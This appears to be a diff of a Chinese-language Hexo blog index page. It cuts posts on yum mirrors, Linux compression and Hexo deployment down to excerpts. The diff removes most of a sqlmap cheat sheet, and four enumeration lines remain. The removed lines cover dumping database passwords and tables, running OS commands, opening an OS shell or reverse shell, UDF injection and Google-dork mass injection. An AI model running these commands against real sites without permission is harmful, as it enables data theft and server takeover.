@@ -74,7 +74,7 @@
 						<li>Links</li>
 						
 						
-						<li>Über</li>
+						<li>About</li>
 						
 					</ul>
 				</div>
@@ -212,7 +212,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/05/CentOS 6.5系统安装LAMP/">系统安装LAMP</a>
+      <a class="article-title" href="/2016/08/05/CentOS 6.5系统安装LAMP/">CentOS 6.5系统安装LAMP</a>
     </h1>
   
 
@@ -283,14 +283,6 @@
         <h2 id="简单三步完成yum源的更改"><a href="#简单三步完成yum源的更改" class="headerlink" title="简单三步完成yum源的更改"></a>简单三步完成yum源的更改</h2><h3 id="1、首先备份-etc-yum-repos-d-CentOS-Base-repo"><a href="#1、首先备份-etc-yum-repos-d-CentOS-Base-repo" class="headerlink" title="1、首先备份/etc/yum.repos.d/CentOS-Base.repo"></a>1、首先备份/etc/yum.repos.d/CentOS-Base.repo</h3><blockquote>
 <p>命令：mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo_backup</p>
 </blockquote>
-<h3 id="2、根据CentOS不同版本选择下载对应的repo文件，放到-etc-yum-repos-d-目录"><a href="#2、根据CentOS不同版本选择下载对应的repo文件，放到-etc-yum-repos-d-目录" class="headerlink" title="2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录"></a>2、根据CentOS不同版本选择下载对应的repo文件，放到/etc/yum.repos.d/ 目录</h3><blockquote>
-<p>命令：cd /etc/yum.repos.d/<br>       wget <a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo" target="_blank" rel="external">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a></p>
-</blockquote>
-<h3 id="3、最后执行yum-makecache生成缓存"><a href="#3、最后执行yum-makecache生成缓存" class="headerlink" title="3、最后执行yum makecache生成缓存"></a>3、最后执行yum makecache生成缓存</h3><blockquote>
-<p>命令：yum makecache</p>
-</blockquote>
-<p>好了，yum源的更改已经完成</p>
-
       
     </div>
     
@@ -299,6 +291,10 @@
       
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/08/04/更改yum源/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -342,13 +338,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="文件的压缩"><a href="#文件的压缩" class="headerlink" title="文件的压缩"></a>文件的压缩</h2><h3 id="常见的压缩文件扩展名"><a href="#常见的压缩文件扩展名" class="headerlink" title="常见的压缩文件扩展名"></a>常见的压缩文件扩展名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">*.Z         compress 程序压缩的文件；</div><div class="line">*.gz        gzip 程序压缩的文件；</div><div class="line">*.bz2       bzip2 程序压缩的文件；</div><div class="line">*.tar       tar 程序打包的数据，并没有压缩过；</div><div class="line">*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩</div><div class="line">*.tar.bz2   tar 程序打包的文件，其中并且经过 bzip2 的压缩</div></pre></td></tr></table></figure>
-<h3 id="文件压缩命令gzip"><a href="#文件压缩命令gzip" class="headerlink" title="文件压缩命令gzip"></a>文件压缩命令gzip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@www ~]<span class="comment"># gzip [-cdtv#] 档名</span></div><div class="line">[root@www ~]<span class="comment"># zcat 档名.gz</span></div><div class="line">选项与参数：</div><div class="line">-c  ：将压缩的数据输出到萤幕上，可透过数据流重导向来处理；</div><div class="line"><span class="_">-d</span>  ：解压缩的参数；</div><div class="line">-t  ：可以用来检验一个压缩档的一致性～看看文件有无错误；</div><div class="line">-v  ：可以显示出原文件/压缩文件的压缩比等资讯；</div><div class="line">-<span class="comment">#  ：压缩等级，-1 最快，但是压缩比最差、-9 最慢，但是压缩比最好！默认是 -6</span></div></pre></td></tr></table></figure>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
-
+        <h2 id="文件的压缩"><a href="#文件的压缩" class="headerlink" title="文件的压缩"></a>文件的压缩</h2><h3 id="常见的压缩文件扩展名"><a href="#常见的压缩文件扩展名" class="headerlink" title="常见的压缩文件扩展名"></a>常见的压缩文件扩展名</h3><pre><code>*.Z         compress 程序压缩的文件；
+*.gz        gzip 程序压缩的文件；
+*.bz2       bzip2 程序压缩的文件；
+*.tar       tar 程序打包的数据，并没有压缩过；
+*.tar.gz    tar 程序打包的文件，其中并且经过 gzip 的压缩
+*.tar.bz2   tar 程序打包的文件，其中并且经过 bzip2 的压缩
+</code></pre>
       
     </div>
     
@@ -357,6 +353,10 @@
       
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/08/04/Linux常用命令/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -400,31 +400,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>#获取当前用户名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-user </p>
-<p>#获取当前数据库名称<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -current-db </p>
-<p>#列出给定数据库的所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” - -tables </p>
-<p>#列出指定库和指定表的所有列<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” - -columns </p>
-<p>#获取指定数据库指定表指定列的内容<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “table_name” -C “column_name1,column_name2” - -dump </p>
-<p>#确定是否为DBA<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -is-dba </p>
-<p>#查看权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges </p>
-<p>#获取所有数据库用户密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords </p>
-<p>#列出指定用户数据库密码<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -passwords -U username </p>
-<p>#列出所有数据库用户角色<br> sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -roles </p>
-<p>#列出所有数据库用户<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -users </p>
-<p>#列出所有数据库名<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dbs </p>
-<p>#查看指定用户权限<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -privileges -U username </p>
-<p>#导出所有数据库所有表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -dump-all </p>
-<p>#导出指定字段的20条数据<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -D “db_name” -T “tablename” -C “password,user,id” - -dump - -start 1 - -stop 20 </p>
-<p>#导入用户自定义函数（获取系统权限！）<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -udf-inject </p>
-<p>#post注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -data “id=3”</p>
-<p>#代理注入<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="external">http://127.0.0.1:8118</a>“</p>
-<p>#执行系统命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-cmd=whoami </p>
-<p>#系统交互<br>shellsqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-shell </p>
-<p>#执行指定sql命令<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -sql-shell </p>
-<p>#反弹shell<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -os-pwn </p>
-<p>#读取win系统注册表<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ - -reg-read </p>
-<p>#google搜索注入点自动跑出所有字段攻击实例<br>sqlmap -u “<a href="http://url?id=1" target="_blank" rel="external">http://url?id=1</a>“ -g “Google dork” - -dump-all - -batch</p>
-
+        <p>#获取当前用户名称<br>sqlmap -u “<a href="http://url?id=1">http://url?id=1</a>“ - -current-user </p>
+<p>#获取当前数据库名称<br>sqlmap -u “<a href="http://url?id=1">http://url?id=1</a>“ - -current-db </p>
+<p>#列出给定数据库的所有表<br>sqlmap -u “<a href="http://url?id=1">http://url?id=1</a>“ -D “db_name” - -tables </p>
+<p>#列出指定库和指定表的所有列<br>sqlmap -u “<a href="http://url?id=1">http://url?id=1</a>“ -D “db_name” -T “tablename” - -columns<br>
       
     </div>
     
@@ -433,6 +412,10 @@
       
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/05/22/SQLMAP常用参数/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
@@ -477,21 +460,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>Github 的搭建</p>
-<p>首先要下载安装以下两个程序：<br>下载 node.js：这个是用来生成静态网页的<br><a href="https://nodejs.org/en/" target="_blank" rel="external">https://nodejs.org/en/</a><br>下载 git：这个是推送 hexo的内容到github上的！<br><a href="https://git-scm.com/download/win" target="_blank" rel="external">https://git-scm.com/download/win</a> </p>
-<p>接下来就是执行命令安装 HEXO，首先在任意（D/E/F/G）盘里边创建一个文件夹（我创建了一个Git文件夹），之后再文件夹上右键点击Git Bash Here：</p>
-<p>打开后进入命令行执行界面</p>
-<p>在窗口中输入命令：npm install -g hexo<br>初始化 hexo<br>命令：hexo init<br>生成静态的页面<br>命令：hexo g<br>启动本地服务进行查看<br>命令：hexo s<br>查看地址<br><a href="http://localhost:4000" target="_blank" rel="external">http://localhost:4000</a><br>接下来与 github 建立关联<br>找到 hexo 中的_config.yml 文件进行配置<br>Deploy：<br>Type: git<br>Repo: <a href="https://github.com/" target="_blank" rel="external">https://github.com/</a> 你的 github 地址<br>Branch: master<br>注意每一个：后边是有空格的<br>然后执行命令</p>
-<p>命令：npm install hexo-deployer-git  - -save</p>
-<p>上边说的是 https 这种协议这种方法，这种方法每次推送的时候需要输入用户名和密码<br>也可以用 sshkey 这种协议方法，这种就不细说了，大家自行百度吧！<br>每次往 github 上推送部署需要执行以下命令：</p>
-<p>git config   - -global user.name “Your Name”<br>git config   - -global user.email “email@example.com”<br>npm install hexo-deployer-git  - -save<br>hexo g    部署<br>hexo d    推送</p>
-<p>Github搭建完成</p>
-<p>上传新的博客时，打开Git Bash Here，输入命令</p>
-<p>hexo new 文件名</p>
-<p>这个时候在\Git\source_posts文件夹下会自动生成 .md 后缀的文件</p>
-<p>打开文件后，可在文件中添加内容，插入图片时，使用image标签<br>便可插入图片</p>
-<p>md文件编辑完后，打开Git Bash Here执行部署和推送命令<br>hexo g（部署）<br>hexo d（推送）</p>
-<p>关于如何上传图片至github<br>首先将图片放置Git\public 文件夹下的任意文夹中，然后打开Git Bash Here执行部署和推送命令<br>hexo g（部署）<br>hexo d（推送）<br>然后登陆github，找到上传的图片位置，打开图片，复制图片的链接地址</p>
-
+<p>首先要下载安装以下两个程序：<br>下载 node.js：这个是用来生成静态网页的<br><a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br>下载 git：这个是推送 hexo的内容到github上的！<br><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a><br>
       
     </div>
     
@@ -500,6 +469,10 @@
       
       
 
+      
+        <p class="article-more-link">
+          <a  href="/2016/04/21/Github的搭建/#more">more >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
